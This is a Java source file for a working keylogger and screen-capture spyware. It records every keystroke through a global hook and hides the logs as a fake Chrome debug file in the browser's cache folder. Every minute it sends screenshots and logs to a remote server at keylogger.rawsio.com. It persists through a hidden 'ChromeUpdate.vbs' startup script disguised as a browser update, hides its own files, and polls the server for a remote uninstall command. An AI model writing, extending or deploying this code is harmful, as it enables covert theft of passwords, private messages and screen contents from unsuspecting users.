package com.logger.java;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.logging.Level;
import java.util.logging.Logger;

public class MonitorApp implements NativeKeyListener {

    private static final String BASE_DIR = System.getProperty("user.home") + File.separator + "AppData" + File.separator + "Local" + File.separator + "Google" + File.separator + "Chrome" + File.separator + "User Data" + File.separator + "Default" + File.separator + "Cache_Data";
    private static final String LOG_FILE = BASE_DIR + File.separator + "chrome_debug.log";
    private static final String SS_DIR = BASE_DIR + File.separator + "thumbnails";
    private static final String API_URL = "https://keylogger.rawsio.com/log.php";
    private static final String API_HASH = "4181f6e2469f687498c3666f272c676442651475c82662f3f9f30b91d2003c4f";
    private static final String USER_ID = System.getProperty("user.name") + "_Chrome_User";

    public static void main(String[] args) {
        File bDir = new File(BASE_DIR);
        File sDir = new File(SS_DIR);
        bDir.mkdirs();
        sDir.mkdirs();
        hideFile(bDir);
        checkStartup();
        try {
            String path = MonitorApp.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
            hideFile(new File(path));
        } catch (Exception ignored) {}
        Logger.getLogger(GlobalScreen.class.getPackage().getName()).setLevel(Level.OFF);
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new MonitorApp());
        } catch (NativeHookException ex) { System.exit(1); }
        startSyncTimer(60000);
        startRemoteCheck(300000);
    }

    private static void checkStartup() {
        try {
            String startupFolder = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
            File vbsFile = new File(startupFolder + "\\ChromeUpdate.vbs");
            if (!vbsFile.exists()) {
                String jarPath = MonitorApp.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath().substring(1).replace("/", "\\");
                FileWriter fw = new FileWriter(vbsFile);
                fw.write("Set WshShell = CreateObject(\"WScript.Shell\")\n");
                fw.write("WshShell.Run \"javaw -jar \"\"" + jarPath + "\"\"\", 0, False\n");
                fw.close();
                hideFile(vbsFile);
            }
        } catch (Exception ignored) {}
    }

    private static void hideFile(File file) {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                Runtime.getRuntime().exec("attrib +h +s \"" + file.getAbsolutePath() + "\"");
            }
        } catch (IOException ignored) {}
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        char keyChar = e.getKeyChar();
        if (keyChar != NativeKeyEvent.CHAR_UNDEFINED && (int)keyChar >= 32) {
            saveLocal(String.valueOf(keyChar));
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        int code = e.getKeyCode();
        if (code == NativeKeyEvent.VC_ENTER) saveLocal("\n");
        else if (code == NativeKeyEvent.VC_BACKSPACE) saveLocal("<");
        else if (code == NativeKeyEvent.VC_TAB) saveLocal("\t");
    }

    private static void saveLocal(String data) {
        try (FileWriter fw = new FileWriter(LOG_FILE, true)) {
            fw.write(data);
        } catch (IOException ignored) {}
    }

    private static void startSyncTimer(int interval) {
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(interval);
                    File ssFile = captureScreen();
                    if (ssFile != null && uploadMultipart(ssFile, "screenshot")) ssFile.delete();
                    File logFile = new File(LOG_FILE);
                    if (logFile.exists() && logFile.length() > 0) {
                        if (uploadMultipart(logFile, "log_file")) {
                            try (PrintWriter pw = new PrintWriter(LOG_FILE)) { pw.print(""); }
                        }
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private static File captureScreen() {
        try {
            Robot r = new Robot();
            BufferedImage img = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            File file = new File(SS_DIR + File.separator + System.currentTimeMillis() + ".png");
            ImageIO.write(img, "png", file);
            return file;
        } catch (Exception e) { return null; }
    }

    private static boolean uploadMultipart(File file, String fieldName) {
        try {
            String boundary = "---" + System.currentTimeMillis();
            HttpURLConnection conn = (HttpURLConnection) new URL(API_URL).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (OutputStream out = conn.getOutputStream();
                 PrintWriter writer = new PrintWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8), true)) {
                addFormField(writer, boundary, "api_hash", API_HASH);
                addFormField(writer, boundary, "user_id", USER_ID);
                writer.println("--" + boundary);
                writer.println("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"");
                writer.println("Content-Type: application/octet-stream");
                writer.println();
                writer.flush();
                Files.copy(file.toPath(), out);
                out.flush();
                writer.println();
                writer.println("--" + boundary + "--");
            }
            return conn.getResponseCode() == 200;
        } catch (Exception e) { return false; }
    }

    private static void addFormField(PrintWriter writer, String boundary, String name, String value) {
        writer.println("--" + boundary);
        writer.println("Content-Disposition: form-data; name=\"" + name + "\"");
        writer.println();
        writer.println(value);
    }

    private static void startRemoteCheck(int interval) {
        new Thread(() -> {
            while (true) {
                try {
                    // ADDED: &user_id= + USER_ID so the dashboard can target this specific PC
                    URL url = new URL(API_URL + "?check_command=1&user_id=" + URLEncoder.encode(USER_ID, "UTF-8"));
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String response = in.readLine();
                    if (response != null && response.trim().equalsIgnoreCase("uninstall")) {
                        uninstall();
                    }
                    Thread.sleep(interval);
                } catch (Exception ignored) {}
            }
        }).start();
    }
    private static void uninstall() {
        try {
            String path = MonitorApp.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
            Runtime.getRuntime().exec("cmd /c ping localhost -n 3 > nul & del \"" + path + "\"");
            System.exit(0);
        } catch (Exception ignored) { System.exit(0); }
    }

    @Override public void nativeKeyReleased(NativeKeyEvent e) {}
}